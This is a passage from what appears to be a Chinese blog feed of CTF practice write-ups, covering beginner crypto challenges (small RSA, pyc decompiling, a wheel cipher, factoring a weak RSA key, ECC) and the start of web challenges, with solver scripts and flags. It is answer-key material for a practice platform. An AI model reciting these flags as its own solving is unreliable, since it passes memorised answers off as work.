n</code>；（公钥加密体制中，一般用公钥加密，私钥解密）<br>e和d可以互换使用，即：<br><code>A=B^d mod n；B=A^e mod n</code></li><li>直接给了p,q,e，求d，即为暴力破解RSA的私钥之一的d</li></ul><p><strong>0x03 解题工具</strong></p><ul><li>python3</li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>自编写payload。</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> gmpy2p <span class="token operator">=</span> <span class="token number">473398607161</span>q <span class="token operator">=</span> <span class="token number">4511491</span>e <span class="token operator">=</span> <span class="token number">17</span>s <span class="token operator">=</span> <span class="token punctuation">(</span>p<span class="token number">-1</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>q<span class="token number">-1</span><span class="token punctuation">)</span>d <span class="token operator">=</span> gmpy2<span class="token punctuation">.</span>invert<span class="token punctuation">(</span>e<span class="token punctuation">,</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'flag is :cyberpeace{%d}'</span> <span class="token operator">%</span> d<span class="token punctuation">)</span></code></pre><ul><li>payload执行结果。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/easy-RSA-flag.png" alt="easy-RSA-flag"></center><p><strong>0x05 考察知识</strong></p><ul><li>RSA</li></ul><h1 id="009-easychallenge"><a href="#009-easychallenge" class="headerlink" title="009 easychallenge"></a>009 easychallenge</h1><p><strong>0x01 题目描述</strong></p><p>​        你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在  了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。</p><p><strong>0x02 解题思路</strong></p><ul><li><p>解释型语言和编译型语言的区别<br>计算机是不能够识别高级语言的，所以当运行一个高级语言程序时，就需要一个“翻译机”来从事把高级语言转变成计算机能读懂的机器语言的过程。这个过程分成两类，第一种是编译，第二种是解释。<br> （1）编译型语言：在程序执行之前，先会通过编译器对程序执行一个编译的过程，把程序转变成机器语言。运行时就不需要翻译，而直接执行就可以了。最典型的例子就是C语言。<br> （2）解释型语言：没有编译的过程，而是在程序运行时，通过解释器对程序逐行解释，然后直接运行，最典型的例子是Ruby。<br> （3）编译型语言与解释型语言的优缺点：编译型语言在程序运行之前就已经对程序做出了“翻译”，所以在运行时就少掉了“翻译”的过程，所以效率比较高。但是我们也不能一概而论。<br> （4）先编译后解释的语言：Java首先是通过编译器编译成字节码文件，然后在运行时通过解释器给解释成机器文件。Java等基于虚拟机的语言的存在，我们又不能把语言纯粹地分成解释型和编译型这两种。Python也是一门基于虚拟机的语言。当我们在命令行中输入python hello.py时，其实是激活了Python的“解释器”，告诉“解释器”：你要开始工作了。可是在“解释”之前，其实执行的第一项工作和Java一样，是编译。</p></li><li><p>Python的运行过程<br>关于PyCodeObject和pyc文件：在硬盘上看到的pyc文件，其实PyCodeObject才是Python编译器真正编译成的结果。当python程序运行时，编译的结果是保存在位于内存中的PyCodeObject中，当Python程序运行结束时，Python解释器则将PyCodeObject写回到pyc文件中。当python程序第二次运行时，首先程序会在硬盘中寻找pyc文件，如果找到，则直接载入，否则就重复上面的过程。所以，我们可以说pyc文件其实是PyCodeObject的一种持久化保存方式。</p></li><li><p>对于py文件，可以执行下面命令来生成pyc文件。<br><code>python -m foo.py</code></p></li><li><p><a href="https://www.cnblogs.com/zyy98877/p/8650119.html" target="_blank" rel="noopener">.py与.pyc文件区别</a><br>原来Python的程序中，是把原始程序代码放在.py文件里，而Python会在执行.py文件的时候。将.py形式的程序编译成中间式文件（byte-compiled）的.pyc文件，这么做的目的就是为了加快下次执行文件的速度。所以，在我们运行python文件的时候，就会自动首先查看是否具有.pyc文件，如果有的话，而且.py文件的修改时间和.pyc的修改时间一样，就会读取.pyc文件，否则，Python就会读原来的.py文件。<br>其实并不是所有的.py文件在与运行的时候都会产生.pyc文件，只有在import相应的.py文件的时候，才会生成相应的.pyc文件</p></li><li><p>给的文件为.pyc文件，先进行反编译为.py文件，再写解密脚本</p></li><li><p>反编译.pyc文件：<br>·  反编译可以使用uncompyle6或者<a href="https://tool.lu/pyc/" target="_blank" rel="noopener">在线反编译pyc</a><br>·  安装uncompyle6 ：pip install uncompyle6<br>·  反编译命令 uncompyle6 crypto11.pyc</p></li></ul><p><strong>0x03 解题工具</strong></p><ul><li>python</li><li>uncompyle6</li><li><a href="https://tool.lu/pyc/" target="_blank" rel="noopener">在线反编译pyc</a></li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>将下载的<code>pyc</code>文件反编译成<code>py</code>文件，反编译结果如下所示。</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># uncompyle6 version 3.5.0</span><span class="token comment" spellcheck="true"># Python bytecode 2.7 (62211)</span><span class="token comment" spellcheck="true"># Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 20:34:20) [MSC v.1916 64 bit (AMD64)]</span><span class="token comment" spellcheck="true"># Embedded file name: ans.py</span><span class="token comment" spellcheck="true"># Compiled at: 2018-08-09 11:29:44</span><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">25</span>        s <span class="token operator">+=</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>        s <span class="token operator">+=</span> chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b32encode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">' '</span><span class="token keyword">print</span> <span class="token string">'Please Input your flag:'</span>flag <span class="token operator">=</span> raw_input<span class="token punctuation">(</span><span class="token punctuation">)</span>final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span><span class="token keyword">if</span> encode3<span class="token punctuation">(</span>encode2<span class="token punctuation">(</span>encode1<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> final<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'correct'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'wrong'</span></code></pre><ul><li>通读代码逻辑编写解密脚本。</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span><span class="token comment" spellcheck="true"># encoding: utf-8</span><span class="token keyword">import</span> base64<span class="token triple-quoted-string string">'''a = 'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='b = base64.b32decode(a)'''</span><span class="token comment" spellcheck="true"># 先将字符串base32解码出来，然后将其变为字符串再进行ord等操作。</span>b <span class="token operator">=</span> <span class="token string">"\xa0\xbe\xa7Z\xb7\xb5Z\xa6\xa0Z\xb8\xae\xa3\xa9Z\xb7Z\xb0\xa9\xae\xa3\xa4\xad\xad\xad\xad\xad\xb2"</span>s <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> b<span class="token punctuation">:</span>    s <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">36</span><span class="token punctuation">)</span>l <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> s<span class="token punctuation">:</span>    l <span class="token operator">+=</span> chr<span class="token punctuation">(</span><span class="token punctuation">(</span>ord<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token punctuation">(</span><span class="token string">'flag is '</span><span class="token punctuation">,</span>l<span class="token punctuation">)</span></code></pre><ul><li>运行得到flag：<code>cyberpeace{interestinghhhhh}</code></li></ul><p><strong>0x05 考察知识</strong></p><ul><li>python反编译</li><li>python编程</li></ul><h1 id="010-转轮机加密"><a href="#010-转轮机加密" class="headerlink" title="010 转轮机加密"></a>010 转轮机加密</h1><p><strong>0x01 题目描述</strong></p><p>​        你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的  也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。 flag，是字符串，小写。</p><p><strong>附件内容</strong>：</p><pre class=" language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">ZWAXJGDLUBVIQHKYPNTCRMOSFE</span> <span class="token operator">&lt;</span><span class="token number">2</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">KPBELNACZDTRXMJQOYHGVSFUWI</span> <span class="token operator">&lt;</span><span class="token number">3</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">BDMAIZVRNSJUWFHTEQGYXPLOCK</span> <span class="token operator">&lt;</span><span class="token number">4</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">RPLNDVHGFCUKTEBSXQYIZMJWAO</span> <span class="token operator">&lt;</span><span class="token number">5</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">IHFRLABEUOTSGJVDKCPMNZQWXY</span> <span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">AMKGHIWPNYCJBFZDRUSLOQXVET</span> <span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">GWTHSPYBXIZULVKMRAFDCEONJQ</span> <span class="token operator">&lt;</span><span class="token number">8</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">NOZUTWDCVRJLXKISEFAPMYGHBQ</span> <span class="token operator">&lt;</span><span class="token number">9</span><span class="token punctuation">:</span>  <span class="token operator">&lt;</span> <span class="token constant">XPLTDSRFHENYVUBMCQWAOIKZGJ</span> <span class="token operator">&lt;</span><span class="token number">10</span><span class="token punctuation">:</span> <span class="token operator">&lt;</span> <span class="token constant">UDNAJFBOWTGVRSCZQKELMXYIHP</span> <span class="token operator">&lt;</span><span class="token number">11</span>： <span class="token operator">&lt;</span> <span class="token constant">MNBVCXZQWERTPOIUYALSKDJFHG</span> <span class="token operator">&lt;</span><span class="token number">12</span>： <span class="token operator">&lt;</span> <span class="token constant">LVNCMXZPQOWEIURYTASBKJDFHG</span> <span class="token operator">&lt;</span><span class="token number">13</span>： <span class="token operator">&lt;</span> <span class="token constant">JZQAWSXCDERFVBGTYHNUMKILOP</span> <span class="token operator">&lt;</span>密钥为：<span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span>密文为：<span class="token constant">NFQKSEVOQOFNP</span></code></pre><p><strong>0x02 解题思路</strong></p><p><strong>转轮机的工作原理</strong><br>        每一个旋转轮代表一个单表替代系统，旋转一个引脚，再转变为另一个单表替代系统。为使机器更安全，可把几种转轮和移动的齿轮结合起来。因为所有转轮以不同的速度移动，n个转轮的机器的周期是26的n次方，即n个单表替代系统。最后一个转轮转完一圈之后，它前面的转轮就旋转一个引脚，有点像时钟的齿轮。</p><p><strong>0x03 解题工具</strong></p><ul><li>python3</li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>自编写payload。</li></ul><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python3</span><span class="token comment" spellcheck="true"># -*- coding:utf-8 -*-</span><span class="token keyword">import</span> resss <span class="token operator">=</span> <span class="token string">'1: &lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt; 2: &lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt; 3: &lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt; 4: &lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt; 5: &lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt; 6: &lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt; 7: &lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt; 8: &lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt; 9: &lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt; 10: &lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt; 11 &lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt; 12 &lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt; 13 &lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;'</span>m <span class="token operator">=</span> <span class="token string">'NFQKSEVOQOFNP'</span><span class="token comment" spellcheck="true"># 将sss转化为列表形式</span>content<span class="token operator">=</span>re<span class="token punctuation">.</span>findall<span class="token punctuation">(</span>r<span class="token string">'&lt; (.*?) &lt;'</span><span class="token punctuation">,</span>sss<span class="token punctuation">,</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># re.S:DOTALL，此模式下，"."的匹配不受限制，可匹配任何字符，包括换行符</span>iv<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span>vvv<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    index<span class="token operator">=</span>content<span class="token punctuation">[</span>iv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>    vvv<span class="token punctuation">.</span>append<span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>vvv<span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    flag<span class="token operator">=</span><span class="token string">""</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        flag <span class="token operator">+=</span> content<span class="token punctuation">[</span>iv<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">(</span>vvv<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">+</span>i<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">26</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><ul><li>执行结果，得到flag：<code>fireinthehole</code></li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/转轮机加密爆破结果.png" alt="转轮机加密爆破结果"></center><p><strong>0x05 考察知识</strong></p><ul><li>转轮加加密</li></ul><h1 id="011-Normal-RSA"><a href="#011-Normal-RSA" class="headerlink" title="011 Normal_RSA"></a>011 Normal_RSA</h1><p><strong>0x01 题目描述</strong></p><p>​        你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光</p><p>附件内容：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/Normal_RSA附件内容.png" alt="Normal_RSA附件内容"></center><p>pubkey.pem:</p><pre class=" language-php"><code class="language-php"><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">BEGIN</span> <span class="token keyword">PUBLIC</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ<span class="token operator">/</span><span class="token operator">+</span>5erCQKPGqxsC<span class="token operator">/</span>bNPXDryigb<span class="token operator">/</span><span class="token operator">+</span>l<span class="token operator">/</span>vjDdAgMBAAE<span class="token operator">=</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span><span class="token constant">END</span> <span class="token keyword">PUBLIC</span> <span class="token constant">KEY</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span></code></pre><p><strong>0x02 解题思路</strong></p><p>​        OpenSSL使用 PEM 文件格式存储证书和密钥。PEM 实质上是 Base64 编码的二进制内容，再加上开始和结束行，如证书文件的<br> —–BEGIN CERTIFICATE—–<br> 和<br> —–END CERTIFICATE—–<br> 在这些标记外面可以有额外的信息，如编码内容的文字表示。文件是 ASCII 的，可以用任何文本编辑程序打开它们。</p><p><strong>0x03 解题工具</strong></p><ul><li>openssl</li><li><a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">进制转换工具</a></li><li>yafu</li><li>rsatool.py</li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>使用<code>openssl</code>提取出<code>pubkey.pem</code>中的参数。</li></ul><pre class=" language-python"><code class="language-python">openssl rsa <span class="token operator">-</span>pubin <span class="token operator">-</span>text <span class="token operator">-</span>modulus <span class="token operator">-</span><span class="token keyword">in</span> warmup <span class="token operator">-</span><span class="token keyword">in</span> pubkey<span class="token punctuation">.</span>pem</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/openssl提取公钥参数.png" alt="openssl提取公钥参数"></center><p>里面<code>modulus</code>就是<code>N</code>，<code>exponent</code>就是<code>e</code><br>这里显示：</p><pre class=" language-python"><code class="language-python">Modulus（hex）<span class="token operator">=</span>C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</code></pre><p>明显是个16进制数，先转换成10进制。</p><ul><li>使用<a href="https://tool.lu/hexconvert/" target="_blank" rel="noopener">进制转换工具</a>将十六进制(hex)表示的大质数(N)转换成十进制(decimal)表示的大质数。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/十六进制转十进制.png" alt="十六进制转十进制"></center><pre class=" language-python"><code class="language-python">Modulus（dec）<span class="token operator">=</span><span class="token number">87924348264132406875276140514499937145050893665602592992418171647042491658461</span></code></pre><ul><li>使用yafu或<a href="http://www.factordb.com/" target="_blank" rel="noopener">factortdb</a>的得到p,q。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/大质数分解.png" alt="大质数分解"></center><p>所以现在知道了：</p><pre class=" language-python"><code class="language-python">p<span class="token operator">=</span><span class="token number">275127860351348928173285174381581152299</span>q<span class="token operator">=</span><span class="token number">319576316814478949870590164193048041239</span>e<span class="token operator">=</span><span class="token number">65537</span></code></pre><ul><li>用<code>rsatool</code>生成私钥文件: <code>private.pem</code>。</li></ul><pre class=" language-python"><code class="language-python"> python2 <span class="token punctuation">.</span>\rsatool<span class="token punctuation">.</span>py <span class="token operator">-</span>o private<span class="token punctuation">.</span>pem <span class="token operator">-</span>e <span class="token number">65537</span> <span class="token operator">-</span>p <span class="token number">275127860351348928173285174381581152299</span> <span class="token operator">-</span>q <span class="token number">319576316814478949870590164193048041239</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/生成私钥pem文件.png" alt="生成私钥pem文件"></center><ul><li>用<code>private.pem</code>解密<code>flag.enc</code>，得到flag：<code>PCTF{256b_i5_m3dium}</code>。</li></ul><pre class=" language-python"><code class="language-python">openssl rsautl <span class="token operator">-</span>decrypt <span class="token operator">-</span><span class="token keyword">in</span> flag<span class="token punctuation">.</span>enc <span class="token operator">-</span>inkey private<span class="token punctuation">.</span>pem</code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/私钥解密得到flag.png" alt="私钥解密得到flag"></center><p><strong>0x05 考察知识</strong></p><ul><li>OpenSSL</li><li>RSA</li><li>大质数分解</li></ul><h1 id="012-easy-ECC"><a href="#012-easy-ECC" class="headerlink" title="012 easy_ECC"></a>012 easy_ECC</h1><p><strong>0x01 题目描述</strong></p><p>​        转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用  懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC  的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}</p><p><strong>附件内容</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/easy_ECC附件内容.png" alt="easy_ECC附件内容"></center><p><strong>0x02 解题思路</strong></p><p><strong>实现椭圆曲线密码实现</strong>：</p><ul><li><p>Alice选定一条椭圆曲线E，并取椭圆曲线上一点作为基点G 假设选定<code>E29(4,20)</code>，基点<code>G(13,23)</code>, 基点G的阶数<code>n=37</code></p></li><li><p>Alice选择一个私有密钥<code>k（k&lt;n）</code>，并生成公开密钥<code>K=kG</code> 比如25,<code>K= kG = 25G = (14,6）</code></p></li><li><p>Alice将E和点K、G传给Bob</p></li><li><p>Bob收到信息后，将待传输的明文编码到上的一点M（编码方法略），并产生一个随机整数r（r&lt;n,n为G的阶数） 假设r=6 要加密的信息为3,因为M也要在<code>E29(4,20)</code> 所以<code>M=(3,28)</code></p></li><li><p>Bob计算点<code>C1=M+rK</code>和<code>C2=rG C1= M+6K= M+6*25*G=M+2G=(3,28)+(27,27)=(6,12) C2=6G=(5,7)</code></p></li><li><p>Bob将C1、C2传给Alice</p></li><li><p>Alice收到信息后，计算<code>C1-kC2</code>，结果就应该是点<code>M C1-kC2 =(6,12)-25C2 =(6,12)-25*6G =(6,12)-2G =(6,12)-(27,27) =(6,12)+(27,2) =(3,28)</code></p></li><li><p><a href="https://blog.csdn.net/dianqu6970/article/details/76534222" target="_blank" rel="noopener">椭圆曲线加密学习的菜鸟入门</a></p></li><li><p><a href="https://www.cnblogs.com/Kalafinaian/p/7392505.html" target="_blank" rel="noopener">ECC椭圆曲线详解(有具体实例)</a></p></li><li><p><a href="https://www.8btc.com/article/15089" target="_blank" rel="noopener">ECC加密算法入门介绍</a></p></li><li><p><a href="https://www.jianshu.com/p/e41bc1eb1d81" target="_blank" rel="noopener">椭圆曲线加密算法</a></p></li></ul><p><strong>0x03 解题工具</strong></p><ul><li><a href="https://bbs.pediy.com/thread-66683.htm" target="_blank" rel="noopener">ECCTool</a></li></ul><p><strong>0x04 解题步骤</strong></p><ul><li>将下载文件中的a,b,p,G(x,y),k等数据输入ECCTool中，点击【CALC R】按钮即可得到Rx,Ry。</li></ul><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/ECCTool椭圆曲线计算.png" alt="ECCTool椭圆曲线计算"></center><ul><li>将Rx和Ry的值相加得到flag：<code>cyberpeace{19477226185390}</code></li></ul><p><strong>0x05 考察知识</strong></p><ul><li>椭圆曲线计算</li></ul><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ul><li><a href="http://www.360doc.com/content/18/0421/12/31784658_747506997.shtml" target="_blank" rel="noopener">古代密码学与信息安全</a></li><li><a href="https://blog.csdn.net/zz_Caleb/article/details/87016017" target="_blank" rel="noopener">各种编码及密码原理</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CRYPTO </tag>
            
            <tag> writeup </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界新手区Web-writeup</title>
      <link href="/2020/09/29/gong-fang-shi-jie-xin-shou-qu-web-writeup/"/>
      <url>/2020/09/29/gong-fang-shi-jie-xin-shou-qu-web-writeup/</url>
      
        <content type="html"><![CDATA[<h1 id="001-view-source"><a href="#001-view-source" class="headerlink" title="001 view_source"></a>001 view_source</h1><p><strong>0x01 题目描述</strong></p><p>​        X老师让小宁同学查看一个网页的源代码，但小宁同学发现鼠标右键好像不管用了。</p><p><strong>0x02 解题思路</strong></p><p>​        一般情况下，在浏览器的页面中右击，然后选择“检查源代码”选项，即可查看本页代码，但在页面中鼠标不能右击，则不能通过此方式查看源代码，需要通过其他方式来查看源代码。</p><ul><li><p>使用快捷键：<code>F12</code></p></li><li><p>代理抓包：Burp抓包，查看回应正文</p></li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/view_source_access_url.png"></li><li><p><code>F12</code>查看网页源码。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/view_source_source_flag.png"></li><li><p>得到Flag:<code>cyberpeace{718cca82af284e4685fb17c2416a09ff}</code>。</p></li></ol><p><strong>0x05 考察知识</strong></p><ul><li>浏览器源码查看方式。</li><li>HTML注释。</li></ul><h1 id="002-get-post"><a href="#002-get-post" class="headerlink" title="002 get_post"></a><strong>002 get_post</strong></h1><p><strong>0x01 题目描述</strong></p><p>​        X老师告诉小宁同学HTTP通常使用两种请求方法，你知道是哪两种吗？</p><p><strong>0x02 解题思路</strong></p><p>​        HTTP最常使用的两种方法分别是GET和POST方法，GET方法将参数写到URL中，POST方法将参数写入请求正文中。</p><ul><li><p>hackbar插件</p></li><li><p>Burp代理（<font color="blue">POST时无法通过</font>）</p></li></ul><p><strong>0x03 解题工具</strong></p><ul><li>Firefox</li><li>HackBar</li></ul><p><strong>0x04 解题步骤</strong></p><ol><li><p>访问题目网址。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/GET_POST_Access_URL.png"></li><li><p>使用GET方式提交一个名为a，值为1的变量。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise Area-writeup/GET_POST_GET.png"></li><li><p>使用POST方式提交一个名为b，值为2的变量。</p><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/CTF/writeup/adworld-Exercise 